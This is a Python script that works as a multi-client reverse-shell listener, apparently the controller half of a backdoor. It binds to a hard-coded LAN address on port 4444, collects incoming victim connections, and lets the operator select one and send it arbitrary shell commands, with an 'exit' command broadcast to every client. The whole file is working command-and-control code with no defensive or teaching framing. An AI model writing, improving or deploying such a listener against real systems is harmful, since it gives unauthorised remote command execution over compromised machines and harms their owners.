import socket, json
import base64
import sys
import threading
from termcolor import colored

def UkDecode(text):
	text = text.decode("cp866")
	for i in range(len(text) - 1):
		if text[i] == "?":
			text = text[:i] + "і" + text[i+1:]
	return text



class Listener:

	def __init__(self, ip, port):
		self.connections = []

		self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.listener.bind((ip, port))

		self.chosen_connection = None

		print("[+] Waiting for incoming connections")


	def listen(self):
		try:
			self.listener.listen(0)
			connection, address = self.listener.accept()
			print("\n[+] Got a connection from " + str(address))
			print("# Press Enter")
			self.connections.append((connection, address))
			self.listen()
		except: pass


	def reliable_send(self, data):
		if self.chosen_connection:
			json_data = json.dumps(data)
			if data == "exit":
				for con in self.connections:
					con[0].send(json_data.encode())
			else:
				self.chosen_connection[0].send(json_data.encode())
		else:
			print(colored("[-] You didn't choose any connection yet", "red"))


	def reliable_recive(self):
		json_data = ""
		while True:
			print(json_data)
			try:
				json_data += self.chosen_connection[0].recv(1024).decode()
				return json.loads(json_data)
			except: continue


	def execute_remotely(self, command):
		self.reliable_send(command)
		return self.reliable_recive()


	def get_connections(self):
		return self.connections


	def close(self):
		self.listener.close()


	def run(self):
		while True:
			if self.chosen_connection: 
				user = self.chosen_connection[1][0]
				command = input(f"{user} # ")
			else: command = input(">>> ")

			if command == "print":
				connections = self.get_connections()
				if connections:
					for con in self.get_connections():
						print(con[1])
				else:
					print(colored("[-] You didn't have any connection yet", "red"))

			elif command == "choose":
				connections = self.get_connections()
				if connections:
					for con in range(len(connections)):
						connection = connections[con][1]
						print(f"{str(con+1)}. {connection}")
					chosen = input("Enter number of connection: ") 
					if not chosen.isdigit():
						print(colored("[~] You must to enter number!", "yellow"))
					elif int(chosen) <= len(connections):
						chosen = int(chosen)
						self.chosen_connection = connections[chosen - 1]
						print("[+] Chosen connection:", self.chosen_connection[1])
					else:
						print(colored("[-] This connection does not exist!"))
				else:
					print(colored("[-] You didn't have any connection yet", "red"))

			elif command == "chosen":
				if self.chosen_connection: 
					print("[+] Chosen connection:", self.chosen_connection[1])
				else: 
					print(colored("[-] You didn't choose any connection yet", "red"))

			elif command == "help":
				help_message = colored("\n Type 'help' to see it\n\n", "yellow")
				help_message += colored(" print", "green") + " - show all connections;\n"
				help_message += colored(" choose", "green") + " - choose connection;\n"
				help_message += colored(" exit", "red") + " - stop the program; \n"
				print(help_message)

			
			elif command == "exit":
				self.execute_remotely("exit")
				self.close()
				exit()

			elif len(command.split()):
				if self.chosen_connection:
					result = self.execute_remotely(command)
					print(result)

				else: print(colored("[-] You didn't choose any connection yet", "red"))



if __name__ == "__main__":
	listener = Listener("192.168.0.108", 4444)

	listen_thread = threading.Thread(target=listener.listen)
	listen_thread.start()

	listener.run()



